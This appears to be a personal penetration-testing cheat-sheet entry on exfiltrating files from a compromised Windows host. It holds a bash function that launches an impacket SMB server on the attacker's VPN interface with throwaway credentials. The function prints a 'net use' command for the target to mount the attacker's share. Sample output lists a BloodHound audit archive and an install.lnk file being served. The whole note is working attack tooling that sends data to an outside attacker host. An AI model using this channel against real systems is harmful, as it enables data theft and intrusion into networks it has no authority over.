---
tags:
  - hack
  - windows
---
# Exfiltrating Files from Windows via SMB

```bash
smbshare() {
  ip=$(ip addr show tun0 | grep 'inet ' | head -n1 | awk '{print $2}' | cut -d/ -f1)
  namelist="/usr/share/wordlists/seclists/Usernames/Names/names.txt"
  user="portia"
  if [[ -f "${namelist}" ]]; then
    user="$(shuf -n1 /usr/share/wordlists/seclists/Usernames/Names/names.txt)"
  fi
  pass="$(head /dev/urandom | tr -dc A-F0-9 | head -c 20)"
  dir="${HOME}/smb"
  echo "Serving from ${dir}:"
  ls -lah "${dir}"
  echo -e "\nTo mount from target:\n"
  echo "   net use x: \\\\${ip}\\share /user:${user} ${pass}"
  echo
  impacket-smbserver share -smb2support "${dir}" -user "${user}" -password "${pass}"
}
```

```console
$ smbshare
Serving from /home/kali/smb:
total 36K
drwxr-x---  2 kali kali 4.0K Feb 28 13:35 .
drwxr-x--- 86 kali kali  12K Mar  1 11:34 ..
-rwxr-x---  1 kali kali  13K Feb 20 14:26 audit_20240220121953_BloodHound.zip
-rwxr-x---  1 kali kali 2.1K Feb 28 13:14 install.lnk

To mount from target:

   net use x: \\192.168.45.181\share /user:yuri 71951653F2A9B1C41519

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
...
```
